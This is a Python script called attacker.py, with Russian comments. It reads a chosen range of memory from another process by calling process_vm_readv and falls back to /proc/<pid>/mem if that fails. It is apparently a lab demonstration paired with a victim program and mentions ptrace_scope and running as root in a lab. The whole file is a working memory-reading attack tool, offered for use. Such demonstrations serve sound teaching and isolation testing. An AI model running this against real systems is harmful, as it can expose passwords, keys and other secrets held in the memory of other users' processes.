#!/usr/bin/env python3
"""
Пытается прочитать память процесса-жертвы.
Сначала пытается использовать process_vm_readv (glibc syscall), если не получится — fallback на /proc/<pid>/mem.
Запуск: python3 attacker.py <pid> <offset> <length>
 offset можно взять как адрес, напечатанный victim.py
"""
import sys
import ctypes
import ctypes.util
import os

libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)

# ssize_t process_vm_readv(pid_t pid,
#   const struct iovec *local_iov, unsigned long liovcnt,
#   const struct iovec *remote_iov, unsigned long riovcnt,
#   unsigned long flags);
class IOVec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p),
                ("iov_len", ctypes.c_size_t)]

def process_vm_read(pid, remote_addr, length):
    # prepare local buffer
    local_buf = ctypes.create_string_buffer(length)
    local_iov = IOVec(ctypes.cast(ctypes.addressof(local_buf), ctypes.c_void_p), length)
    remote_iov = IOVec(ctypes.c_void_p(remote_addr), length)
    n = libc.process_vm_readv(ctypes.c_int(pid),
                              ctypes.byref(local_iov), ctypes.c_ulong(1),
                              ctypes.byref(remote_iov), ctypes.c_ulong(1),
                              ctypes.c_ulong(0))
    if n == -1:
        err = ctypes.get_errno()
        raise OSError(err, os.strerror(err))
    return local_buf.raw[:n]

def read_proc_mem(pid, remote_addr, length):
    path = f"/proc/{pid}/mem"
    with open(path, "rb") as f:
        f.seek(remote_addr)
        return f.read(length)

def main():
    if len(sys.argv) < 4:
        print("Usage: python3 attacker.py <pid> <hex_addr> <length>")
        return
    pid = int(sys.argv[1])
    remote_addr = int(sys.argv[2], 16)
    length = int(sys.argv[3])
    print(f"attacker: pid={pid} addr={hex(remote_addr)} len={length}")
    # Try process_vm_readv first
    try:
        data = process_vm_read(pid, remote_addr, length)
        print("process_vm_readv succeeded. Data (repr):")
        print(repr(data))
        return
    except Exception as e:
        print("process_vm_readv failed:", e)
    # Fallback to /proc/<pid>/mem
    try:
        data = read_proc_mem(pid, remote_addr, length)
        print("/proc/<pid>/mem succeeded. Data (repr):")
        print(repr(data))
    except Exception as e:
        print("/proc/<pid>/mem failed:", e)
        print("If both failed, check: ptrace_scope, permissions, SELinux/AppArmor, or run as root in lab.")

if __name__ == "__main__":
    main()
